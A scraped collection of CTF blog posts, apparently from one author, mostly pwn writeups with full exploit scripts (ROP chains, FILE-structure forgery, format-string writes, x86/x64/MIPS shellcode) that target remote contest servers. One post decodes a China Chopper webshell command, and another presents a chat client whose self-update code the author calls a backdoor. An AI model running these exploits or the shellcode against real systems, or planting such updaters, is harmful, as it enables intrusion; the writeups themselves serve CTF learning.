qword ptr [rsi], rax ; ret p += pack('&lt;Q', 0x0000000000401b97) # pop rsi ; ret p += pack('&lt;Q', 0x00000000006c1068) # @ .data + 8 p += pack('&lt;Q', 0x000000000041c3cf) # xor rax, rax ; ret p += pack('&lt;Q', 0x00000000004714a1) # mov qword ptr [rsi], rax ; ret p += pack('&lt;Q', 0x0000000000401a83) # pop rdi ; ret p += pack('&lt;Q', 0x00000000006c1060) # @ .data p += pack('&lt;Q', 0x0000000000401b97) # pop rsi ; ret p += pack('&lt;Q', 0x00000000006c1068) # @ .data + 8 p += pack('&lt;Q', 0x0000000000437835) # pop rdx ; ret p += pack('&lt;Q', 0x00000000006c1068) # @ .data + 8 p += pack('&lt;Q', 0x000000000041c3cf) # xor rax, rax ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464120) # add rax, 1 ; ret p += pack('&lt;Q', 0x0000000000464e75) # syscall ; ret return pcreate_fast(\"aaa\")del_fast()create_small(\"aaa\")del_fast()create_fast(\"aaa\")del_fast()edit_small(p64(0x6C4Aa0))say()create_fast(p64(0x6C4A80))edit(0x6C3750,p64(0x4082A0))edit(0x6C2710,\"%8$llX\")del_small()stack_addr = int(ru(\"\\n\")[:12],16)-0x18print \"stack_addr=\"+hex(stack_addr)edit(stack_addr,getchain())p.interactive()","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"heap overflow","slug":"heap-overflow","permalink":"https://winter3un.github.io/tags/heap-overflow/"}]},{"title":"FILE结构体的溢出利用【FSP】","date":"2017-03-17T14:31:51.000Z","path":"2017/03/17/FILE结构体的溢出利用【FSP】/","text":"FILE用到的知识点 参考自 http://bobao.360.cn/learning/detail/3296.html 题目来源于BCTF 线上总决赛资格赛 pwn50题目地址 https://github.com/Winter3un/ctf_task/tree/master/BCTF2017 用到的一个shellcode姿势点如下: 使用msfvenom生成payload。由于我这边用的wookali，没有自带msf。Download it中文文档：http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf 生成shellcode:msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b &#39;\\x00\\x0b\\x0d\\x0a&#39; 通过伪造FILE结构体，获得一次控制EIP的机会，同时 meun 函数存在经典栈溢出 scanf(&quot;%s&quot;,&amp;v1);,可以构造rop，并利用一次控制EIP的机会执行ROP，该ROP利用mprotect函数将bss段设置为可执行，并执行放置入bss区域的规避掉坏字符的shellcode。 exp如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context(log_level=\"debug\")# p = process(\"./fake\")p = remote('106.75.93.221',12345 )x_addr = 0x80EF9E0fp_addr = 0x80EFA00jump_addr = fp_addr+0x10+4*0x25+4+8eip_addr = 0x805069dread_addr = 0x8071460printf_addr = 0x804F6D0Welcome_addr = 0x0804889Cmenu_addr = 0x8048AFFp_ret = 0x080481d1ppp_ret = 0x0804f7damprotect_addr = 0x08071FD0page_size = 4096p.recvuntil(\"name?\\n\")payload = \"a\"*(fp_addr-x_addr)+p32(fp_addr+4)# IO_FILE = p32(x_addr)*0x25+p32(jump_addr)x=0x10IO_FILE = p32(fp_addr)*(0x11-x)+p32(0)*x+\"\\x00\\x00\"+\"\\x00\"+\"\\x00\"+p32(fp_addr)*0x13+p32(jump_addr)JUMP = p32(0)*2+p32(eip_addr)*21gdb.attach(p,\"b*0x805069d\\nb*0x805442A\\nb*0x80534bb\\nc\")payload +=IO_FILE+JUMPshellcode_addr = (0x80EF9E0 + len(payload))print \"shellcode_addr=\"+hex(shellcode_addr)exec_addr = (0x80EF9E0 + len(payload))&amp;~(page_size-1)buf = \"\"buf += \"\\x2b\\xc9\\x83\\xe9\\xf5\\xe8\\xff\\xff\\xff\\xff\\xc0\\x5e\\x81\"buf += \"\\x76\\x0e\\x9d\\x3a\\x39\\x8f\\x83\\xee\\xfc\\xe2\\xf4\\xf7\\x31\"buf += \"\\x61\\x16\\xcf\\x5c\\x51\\xa2\\xfe\\xb3\\xde\\xe7\\xb2\\x49\\x51\"buf += \"\\x8f\\xf5\\x15\\x5b\\xe6\\xf3\\xb3\\xda\\xdd\\x75\\x32\\x39\\x8f\"buf += \"\\x9d\\x15\\x5b\\xe6\\xf3\\x15\\x4a\\xe7\\x9d\\x6d\\x6a\\x06\\x7c\"buf += \"\\xf7\\xb9\\x8f\"shellcode = bufpayload+=shellcodep.sendline(payload)p.recvuntil(\"&gt; \")payload2 = p32(mprotect_addr)+p32(ppp_ret)+p32(exec_addr)+p32(page_size)+p32(7)+p32(shellcode_addr)p.sendline(\"3\"+\"a\"*(0x3c-1)+payload2)p.interactive()","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"bctf","slug":"bctf","permalink":"https://winter3un.github.io/tags/bctf/"}]},{"title":"XDCTF2016_铁人三项_WP（HTTP数据包的快速分析）","date":"2016-10-05T07:33:21.000Z","path":"2016/10/05/xdctf2016-wp/","text":"分析题目如下 下载数据包（光下载就用了我两天。。比赛都结束了，也是醉醉的） 下载完毕后发现有多个数据包，使用wireshark自带的pcap数据包合并工具将多个pcap数据包合并成为一个数据包 sum.pcap 使用wireshark打开分析，在文件-＞导出对象－＞HTTP 中发现敏感的登陆页面，并且多次出现，猜测应该是黑客爆破的登陆页面。 接着使用过滤规则http and ((ip.src == 219.239.105.18 and ip.dst == 172.16.61.210) or (ip.src == 172.16.61.210 and ip.dst == 219.239.105.18))，仔细分析对应的HTTP攻击流量。 然而wireshark还是太麻烦了。。。 做起来太耗时间，想着能否有一个工具可以提取出pcap数据包中对应的IP的HTTP协议数据包，把heard 和 body 都提出来。 找了一下发现一个神器https://github.com/caoqianli/httpcap#usage 安装完毕后，使用其进行数据包分析，首先提取我们迫切需要的数据。 parse-pcap -i 219.239.105.18 -vvv sum.pcap &gt; 1.html 然后使用notepad++对其进行手工分析（数据量已经很少了。 找到关键数据,用户名为root 密码为 123456 题一、题二已经解决。 发现黑客进入后台后，修改的页面为index.html，题三解决 如下图可以看到，黑客已经将一句话木马写入web服务器，且其口令为chopper，完整连接地址为http://118.194.196.232/index.php?m=search,题四、题五解决。通过查看返回包得知其执行的命令为pwd，查看当前目录绝对路径的命令。 继续往下分析。发现其查看了目录文件，继而返回去分析其命令。 chopper=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8%3D url解码 chopper=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBPciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkRikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkBmaWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRMLj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&amp;z1=L3Zhci93d3cvaHRtbC8= z0为12@ini_set(&quot;display_errors&quot;,&quot;0&quot;);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(Ii0 |&quot;);;$D=base64_decode($_POST[&quot;z1&quot;]);$F=@opendir($D);if($F==NULL)&#123;echo(&quot;ERROR:// Path Not Found Or No Permission!&quot;);&#125;else&#123;$M=NULL;$L=NULL;while($N=@readdir($F))&#123;$P=$D.&quot;/&quot;.$N;$T=@date(&quot;Y-m-d H:i:s&quot;,@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R=&quot;\\t&quot;.$T.&quot;\\t&quot;.@filesize($P).&quot;\\t&quot;.$E.&quot;&quot;;if(@is_dir($P))$M.=$N.&quot;/&quot;.$R;else $L.=$N.$R;&#125;echo $M.$L;@closedir($F);&#125;;echo(&quot;|&lt;-&quot;);die(); z1为/var/www/html/ 可知其查看的第一个文件目录为/var/www/html，第六个问题解决。 发现数据还没查看玩，继续拉下去分析。。。。竟然发现了sqlmap跑包的数据，特么一句话都有了，还搞sqlmap干啥？？？ - -。。。 如下图，大量对http://118.194.196.232:8090/webmail/userapply.php?execadd=111&amp;DomainID=111的Domain参数进行sql注入尝试的http数据包。然而并没有什么软用","tags":[{"name":"writeup","slug":"writeup","permalink":"https://winter3un.github.io/tags/writeup/"},{"name":"web","slug":"web","permalink":"https://winter3un.github.io/tags/web/"}]},{"title":"C/S-WeChat","date":"2016-07-19T15:48:33.000Z","path":"2016/07/19/C-S-WeChat/","text":"前记某日战队的一个小伙伴提出来，可以制作一个基于socket的聊天室出来，用来应对比赛时的交流问题（嗯。。不是有微信和QQ么。。），不过想法很不错。我也借着这次机会复习一下python的socket网络编程。 这些项目保存在我的github上，并且看我心情更新。 未解决问题： 数据明文传输，未加密。 未设置登录限制，可以匿名随意进入聊天室。 易被DDOS 未发现的问题 client模块 首先检测是否有更新，若有更新则下载最新的更新。 异步接收远程服务器传递过来的数据，一旦接收到数据则puts到界面。 接收用户输入的数据，当用户输入回车后将数据发送到远程服务器上 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/env python# encoding: utf-8\"\"\"@version: ??@author: WinterSun@contact: 511683586@qq.com@site: http://blog.csdn.net/yuanyunfeng3@software: PyCharm@file: client.py@time: 2016/7/8 0:43\"\"\"import socket,threading,selectimport hashlib,sys,osdef upgrade(): filepath = sys.path[0]+os.sep+sys.argv[0] with open(filepath,'rb') as f: local_hash = hashlib.md5(f.read()).hexdigest() addr = ('123.207.98.208',55557) s = socket.socket() try: s.connect(addr) s.send(local_hash) inputs= [s] rs,ws,es = select.select(inputs,[],[],1) for r in rs: data = r.recv(1024) if data == '1': print \"this is the lastest version!\" inputs.remove(r) r.close() return False else: s.send('get file_size') size = s.recv(1024) s.send(\"get file\") new_file = s.recv(int(size)) with open(filepath,'wb') as f: f.write(new_file) print \"the client is upgraded,plz restart it!\" return True except Exception,e: print e print \"can't connect update_sever\" return Truedef read(s): inputs= [s] while True: rs,ws,es = select.select(inputs,[],[],1) for r in rs: print r.recv(1024)def write(s): while True: try: info = raw_input() except Exception,e: print e exit(0) try: s.send(info) except Exception,e: print e exit()if __name__ == '__main__': if upgrade(): exit(0) host = raw_input(\"plz input sever [ip:port] :\") host,port = host.split(':') addr = (host,int(port)) s = socket.socket() try: s.connect(addr) except: print \"can't connect this sever!\" exit(0) name = raw_input(\"plz input your name:\") s.send(name) t1 = threading.Thread(target=read,args=(s,)) t2 = threading.Thread(target=write,args=(s,)) t1.start() t2.start() server模块请设置port，默认为10087 不断接收新的套接字。 当有新的套接字进入时，将欢迎信息发送过去。 第一次输入为用户名。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#!/usr/bin/env python#-*-coding=utf8-*-\"\"\"@version: ??@author: WinterSun@contact: 511683586@qq.com@site: http://blog.csdn.net/yuanyunfeng3@software: PyCharm@file: sever.py@time: 2016/7/8 0:08\"\"\"import socket,selecthost='0.0.0.0'prot=10087s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.bind((host,prot))s.listen(5)inputs = [s]namedic = &#123;&#125;namelist = []def send(data,inputs): for x in inputs: if x != s: try: x.send(data) except Exception,e: print e if x in inputs: inputs.remove(x) x.close() send(namedic[x]+\"\\tleaving!\\n\",inputs)if __name__ == '__main__': while True: rs,ws,es = select.select(inputs,[],[],1) for r in rs: if r is s: conn,addr = r.accept() print 'Connect by',addr while True: try: name = conn.recv(1024) if len(name) &gt; 30: conn.send(\"your name is toooooo long!\\n\") continue else: namedic[conn] = name namelist.append(name) inputs.append(conn) data = \"Welcome \"+name send(data,inputs) break except socket.error: pass else: try: data = r.recv(1024) print namedic[r]+\":\"+data if not data: data = \"\\tleaving!\\n\" print namedic[r]+data if r in inputs: inputs.remove(r) r.close() send(namedic[r]+data,inputs) else: send(namedic[r]+\":\"+data,inputs) except : data = \"\\tleaving!\\n\" print namedic[r]+data if r in inputs: inputs.remove(r) r.close() send(namedic[r]+data,inputs) upgrade模块为了方便软件更新，特加入upgrade模块用于更新。（讲道理，这个其实是后门） 123456789101112131415161718192021222324252627282930313233343536373839404142#!/usr/bin/env python# encoding: utf-8import hashlib,socket,selecthost='0.0.0.0'prot=55557s= socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.bind((host,prot))s.listen(5)inputs = [s]while True: rs,ws,es = select.select(inputs,[],[],1) for r in rs: if r is s: conn,addr = r.accept() print 'Connect by',addr try: local_hash = conn.recv(1024) with open('client.py','rb') as f: lastest_hash = hashlib.md5(f.read()).hexdigest() if local_hash == lastest_hash: conn.send('1') conn.close() else: conn.send('0') inputs.append(conn) except: pass else: try: data = r.recv(1024) with open('client.py','rb') as f: file = f.read() if data ==\"get file_size\": print \"send file_size\" # print len(file),type(len(file)) r.sendall(str(len(file))) if data ==\"get file\": print \"send file\" r.sendall(file) except: pass","tags":[{"name":"code","slug":"code","permalink":"https://winter3un.github.io/tags/code/"},{"name":"python","slug":"python","permalink":"https://winter3un.github.io/tags/python/"}]},{"title":"杂记-2016-7-18","date":"2016-07-19T05:45:44.000Z","path":"2016/07/18/杂记-2016-7-18/","text":"前记这阵子发生了太多事情了，刚打完的ICQ的pwn部分都没来及上传，就匆匆的回到了警校进行节奏紧凑的训练。说实话，这次训练的体能真的不是我的强项，每次体能训练完了就像具尸体一样，不过那样又如何？我本就不是一个轻易服输的人。 ICQ2016-WPpwn1exp如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *context(log_level=\"debug\")# p = process(\"./pwn1\")p = remote(\"106.75.37.29\",10000)elf = ELF(\"./pwn1\")scanf_plt = elf.symbols[\"__isoc99_scanf\"]system_plt = elf.symbols[\"system\"]# system_got#0x0804857Edef add(off,value): p.recvuntil(\"input index:\") p.sendline(str(off)) p.recvuntil(\"value:\") p.sendline(str(value)) p.recvuntil(\"input index:\") p.sendline(str(0x28-0xc)) p.recvuntil(\"value:\") p.sendline(\"0\")def change(off,l): i = 0 for x in l: p1 = x &amp; 0xff p2 = (x &gt;&gt; 8) &amp; 0xff p3 = (x &gt;&gt; 16) &amp; 0xff p4 = (x &gt;&gt; 24) &amp; 0xff add(60-16+i,p1) i+=1 add(60-16+i,p2) i+=1 add(60-16+i,p3) i+=1 add(60-16+i,p4) i+=1 return il = [scanf_plt,0x080486ae,0x080486ED,0x804A028,scanf_plt,0x080486ae,0x080486ED,0x804A02c,system_plt,0x080486ae,0x804A028]#system_plt,0x080486ae,0x804A028index = change(60,l)p.recvuntil(\"input index:\")p.sendline(str(0x28-0xc))p.recvuntil(\"value:\")p.sendline(\"10\")p.recvuntil(\"Your Array:0 0 0 0 0 0 0 0 0 0 \")# gdb.attach(p,\"b*0x0804857E\\nc\")p.sendline(str(u32(\"/bin\")))p.sendline(str(u32(\"/sh\\0\")))p.interactive()#flag&#123;9587c60c6962efc66d5adc7d18ee5500&#125; pwn2卡了一段时间，挺好玩的,exp如下： 123456789101112131415161718192021222324252627282930313233343536from pwn import *context(log_level=\"debug\")# p = process(\"./pwn2\")p = remote(\"106.75.37.31\",23333)p.recvuntil(\"ight!\\n\\n\")op_add_mv = chr((0xD70-0xb10)/8+43)op_exit = chr((0xD40-0xb10)/8+43)op_sub = chr((0xB28-0xb10)/8+43)op_mov_l = chr((0xD20-0xb10)/8+43)for x in range(0,23): p.sendline(op_sub)for x in range(0,0x2f+2): p.sendline(op_add_mv)for x in range(0,4): p.sendline(op_sub)shellcode = \"\\x90\"*60+\"\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05\"p.sendline(str(0x602080+40))p.sendline(str(0x602080+40))p.sendline(shellcode)p.sendline(op_mov_l)p.sendline(op_add_mv)# gdb.attach(p,\"b*0x400776\\nc\")p.sendline(op_exit)p.interactive()#flag&#123;53ed43a93ec84fe99ddbd33d5acf5284&#125; pwn3没做出来，本地没有调试环境，卒。。 后面fuzz了一下，exp如下: 12345678910111213141516171819202122from pwn import *context(log_level=\"debug\")shellcode1 = \"\\xff\\xff\\x10\\x04\\xab\\x0f\\x02\\x24\\x55\\xf0\\x46\\x20\\x66\\x06\\xff\\x23\\xc2\\xf9\\xec\\x23\\x66\\x06\\xbd\\x23\\x9a\\xf9\\xac\\xaf\\x9e\\xf9\\xa6\\xaf\\x9a\\xf9\\xbd\\x23\\x21\\x20\\x80\\x01\\x21\\x28\\xa0\\x03\\xcc\\xcd\\x44\\x03/bin/sh\\x00\"shellcode2 = \"\\x28\\x06\\xff\\xff\\x3c\\x0f\\x2f\\x2f\\x35\\xef\\x62\\x69\\xaf\\xaf\\xff\\xf4\\x3c\\x0e\\x6e\\x2f\\x35\\xce\\x73\\x68\\xaf\\xae\\xff\\xf8\\xaf\\xa0\\xff\\xfc\\x27\\xa4\\xff\\xf4\\x28\\x05\\xff\\xff\\x24\\x02\\x0f\\xab\\x01\\x01\\x01\\x0c\"for y in range(0,10): for x in range(0,4): try: p = remote(\"106.75.32.60\",10000) p.recvuntil(\"lp' for help.\\n\") p.sendline(\"2057561479\") data = p.recvuntil(\"\\n\")[-9:-1] off = int(data,16) print \"shellcode_addr = \" +hex(off) payload = \"20160606 0\" payload += \"\\x00\"*(0x70+y-len(shellcode2)-len(payload))+shellcode2+p32(off+29+x) # payload += \"\\x00\"*(0x74-len(shellcode2)-10)+shellcode+p32(off) print y,x p.sendline(payload) p.interactive() except: p.close() 后记这阵子可能真的没有时间去做二进制研究了。 直视自己。","tags":[]},{"title":"【ICQ2016】 writeup","date":"2016-07-05T22:28:40.000Z","path":"2016/07/05/ICHUNQIU2016-PWN/","text":"pwn1func函数数组指针的索引没有规定范围，可以越界。 exp如下 12345678910111213141516from pwn import *context(log_level=\"debug\")addr =0x0804A030bbs = 0x0804A0A0offset = (bbs - addr)/4+1# p =process('./tc1')p = remote('106.75.9.11',20000)# gdb.attach(p,'b*0x8048641\\nc')shellcode = p32(bbs+4)+ '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80'p.recvuntil('de\\n')p.sendline(str(offset))p.recvuntil(' 110]\\n')p.sendline(shellcode)p.interactive() pwn2经典的fmt漏洞。fmt一发，天下我有。 123456789101112131415161718192021222324252627282930313233343536373839from pwn import *context(log_level =\"debug\")buf = \"\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\";bss = 0x080EBF80# p = process(\"./echo-200\")p = remote('106.75.9.11',20001)got_addr =0x80EB00Cshellcode = bufshellcode_addr = bssret_offset = 0xffc56dbc - 0xffc56bacdef write(addr,data): p.recvuntil(\"Reading 16 bytes\\n\") p.sendline(p32(addr)+\"%%%dc\" %(ord(data)-4) +\"%7$hhn\")i = 0while i &lt; len(shellcode): write(shellcode_addr+i,shellcode[i]) i +=1p.recvuntil('Reading 16 bytes\\n')p.sendline('%5$X...')stack_addr = int(p.recvuntil('...')[:8],16)ret_addr = stack_addr + ret_offseti = 0while i &lt; len(p32(shellcode_addr)): write(ret_addr+i,p32(shellcode_addr)[i]) i +=1# gdb.attach(p,\"b*0x08048FB6\\nc\")write(stack_addr-1,'\\x01')p.interactive()#flag&#123;b3a0b33-645f-49f0-8e30-2d7c31ecfabb&#125; pwn3看着这熟悉的bin文件，我蛋都疼了。。这不是蒸米的么。。就改了字符串。。真心蛋疼。。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# -*-coding=utf8-*-from pwn import *# context(log_level=\"debug\")elf = ELF('qwb3')write_plt = elf.symbols[\"write\"]read_plt = elf.symbols[\"read\"]write_got = elf.got[\"write\"]read_got =elf.got[\"read\"]rop_addr = 0x40062Asystem_got =0x601010main = 0x40059d# gdb.attach(p,\"b*0x40059C\\nc\")# p = process('./qwb3')p = remote('106.75.8.230',19286)# p = remote('127.0.0.1',10001)p.recvuntil('\\n')bss = 0x601038def leak(addr): payload = '\\x00'*(0x40)+p64(0)+p64(rop_addr)+p64(0)+p64(1)+p64(write_got)+p64(8)+p64(addr)+p64(1)+p64(0x400610)+7*8*'\\x00'+p64(main) p.send(payload) sleep(1) data = p.recv(8) p.recvuntil('\\n') print \"%#x =&gt; %s\" % (addr, (data or '').encode('hex')) return data# d = DynELF(leak, elf=ELF('./qwb3'))# system_addr = d.lookup('execve', 'libc')# print hex(u64(leak(write_got)))system_addr = u64(leak(write_got)) - (0x7f7d4bb06510- 0x7f7d4bad7da0)# system_addr = u64(leak(write_got)) - (0x7fac9451d4d0- 0x7fac944f1040)print \"system_addr=\" + hex(system_addr)### send '/bin/sh'# gdb.attach(p,\"b*0x40059C\\nc\")payload2 = '\\x00'*(0x40)+p64(0)+p64(rop_addr)+p64(0)+p64(1)+p64(read_got)+p64(16)+p64(bss)+p64(0)+p64(0x400610)+7*8*'\\x00'+p64(main)p.send(payload2)sleep(1)p.send('/bin/sh\\0'+p64(system_addr))p.recvuntil('\\n')### call systempayload4 = '\\x00'*(0x40)+p64(0)+p64(rop_addr)+p64(0)+p64(1)+p64(bss+8)+p64(0)+p64(0)+p64(bss)+p64(0x400610)+7*8*'\\x00'+p64(main)p.send(payload4)p.interactive()###ps：发包一定要在一个包里发完。。不然。。。 pwn4本来期待着pwn4是一个堆的利用，结果是爆破。。爆破。。竟然是爆破。。这特么能作pwn4？ 12345678910111213141516171819202122232425262728293031from pwn import *import string# context(log_level =\"debug\")printable = string.uppercase+string.lowercase+string.octdigits+string.punctuationdef getflag(flag): sleep(0.1) # p = process('./cg_leak') p = remote('106.75.8.230',13349) p.recvuntil('OUR NAME:') p.sendline('admin') p.recvuntil(\"'s your name again?\\n\") p.sendline('admin') p.recvuntil('FLAG: ') p.sendline(flag) data = p.recvuntil('\\n') p.close() if data == 'Try submit then!\\n': return True else: return Falseflag = ''i = 0while i&lt;40: for x in printable: if getflag(flag+x): flag+=x print flag i+=1print flag#FLAG&#123;wh4t3v3r_1s_0k&#125;","tags":[{"name":"pwn","slug":"pwn","permalink":"https://winter3un.github.io/tags/pwn/"},{"name":"writeup","slug":"writeup","permalink":"https://winter3un.github.io/tags/writeup/"}]},{"title":"【CFF2016-pwn】 Writeup","date":"2016-06-20T17:55:02.000Z","path":"2016/06/20/CCF2016/","text":"pwn1简单的变量覆盖。 12python -c &apos;print &quot;a&quot;*0x40+&quot;\\x1b\\x86\\x04\\x08&quot;&apos;|nc 139.196.232.222 54000一发带走 pwn2scanf没有限制输入字节，可发送超长字符串导致栈溢出。 只开了NX，但是用程序自带的后门是无法读取flag的，自己发送个&quot;/bin/sh\\0&quot;然后构造rop，拿shell123456789101112131415from pwn import *context(log_level=\"debug\")elf = ELF('memory')system_plt = elf.symbols['system']scanf_plt = elf.symbols['__isoc99_scanf']pp_ret = 0x804877e_s = 0x8048817data = 0x0804A038p = process('./memory')payload1 = 'a'*(0x13+4)+p32(scanf_plt)+p32(pp_ret)+p32(_s)+p32(data)+p32(system_plt)+p32(0)+p32(data)p.sendline(payload1)p.sendline('/bin/sh\\0')p.interactive() 接下来12find /|grep flag/bin/cat xxx #忘记位置了 pwn3 把文件里面这个位置的数据改成0x88，进入这个函数里面，会给一个web服务器的地址，把改变后的文件上传就拿flag。 